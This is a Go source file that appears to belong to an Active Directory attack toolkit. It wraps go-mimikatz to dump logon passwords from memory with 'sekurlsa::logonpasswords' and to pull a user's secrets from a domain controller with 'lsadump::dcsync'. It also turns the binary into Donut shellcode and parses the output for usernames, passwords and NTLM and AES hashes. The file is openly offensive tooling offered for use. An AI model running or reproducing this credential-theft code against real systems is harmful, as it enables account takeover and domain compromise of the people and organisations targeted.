package tools

import (
	"adpack/utils"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

type goMimikatzTool struct{}

var GoMimikatz = goMimikatzTool{}

func (goMimikatzTool) Name() string    { return "go-mimikatz" }
func (goMimikatzTool) Available() bool { return utils.ToolAvailable("go-mimikatz") }

type GoMimikatzConfig struct {
	Binary     string
	Command    string // e.g. "sekurlsa::logonpasswords"
	OutputFile string
	Timeout    int // seconds
}

func DefaultGoMimikatzConfig() GoMimikatzConfig {
	return GoMimikatzConfig{
		Binary:  "go-mimikatz",
		Command: "sekurlsa::logonpasswords",
		Timeout: 60,
	}
}

func (g goMimikatzTool) Run(cfg GoMimikatzConfig) utils.CmdResult {
	args := []string{cfg.Command}
	r := utils.RunCommandTimeout(
		time.Duration(cfg.Timeout)*time.Second,
		cfg.Binary, args,
	)
	return r
}

func (g goMimikatzTool) Sekurlsa(cfg GoMimikatzConfig) utils.CmdResult {
	cfg.Command = "sekurlsa::logonpasswords"
	return g.Run(cfg)
}

func (g goMimikatzTool) SekurlsaDcsync(domain, user string) utils.CmdResult {
	r := utils.RunCommand("go-mimikatz",
		"lsadump::dcsync",
		fmt.Sprintf("/domain:%s", domain),
		fmt.Sprintf("/user:%s", user),
	)
	return r
}

func (g goMimikatzTool) DonutShellcode(cfg GoMimikatzConfig, donutOutput string) error {
	if !Donut.Available() {
		return fmt.Errorf("go-mimikatz: donut not available, cannot convert to shellcode")
	}
	bin := g.binary()
	if bin == "" {
		return fmt.Errorf("go-mimikatz: binary not found")
	}
	_, err := Donut.WrapPE(bin, cfg.Command)
	if err != nil {
		return fmt.Errorf("go-mimikatz: donut wrapping failed: %w", err)
	}
	if donutOutput != "" {
		expected := bin + ".bin"
		input, err := os.ReadFile(expected)
		if err != nil {
			return fmt.Errorf("go-mimikatz: reading donut output: %w", err)
		}
		if err := os.WriteFile(donutOutput, input, 0644); err != nil {
			return fmt.Errorf("go-mimikatz: writing shellcode to %s: %w", donutOutput, err)
		}
	}
	return nil
}

func (g goMimikatzTool) ParseOutput(output string) []string {
	lines := strings.Split(output, "\n")
	var creds []string
	for _, line := range lines {
		lower := strings.ToLower(line)
		if strings.Contains(lower, "username") || strings.Contains(lower, "password") ||
			strings.Contains(lower, "domain") || strings.Contains(lower, "ntlm") ||
			strings.Contains(lower, "aes") || strings.Contains(lower, "hash") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val != "" && val != "(null)" {
					creds = append(creds, fmt.Sprintf("%s: %s", strings.TrimSpace(parts[0]), val))
				}
			}
		}
	}
	return creds
}

func (g goMimikatzTool) binary() string {
	if utils.ToolAvailable("go-mimikatz") {
		return "go-mimikatz"
	}
	p, err := exec.LookPath("go-mimikatz.exe")
	if err == nil {
		return p
	}
	return ""
}

func (c GoMimikatzConfig) TimeoutSeconds() int {
	if c.Timeout <= 0 {
		return 90
	}
	return c.Timeout
}
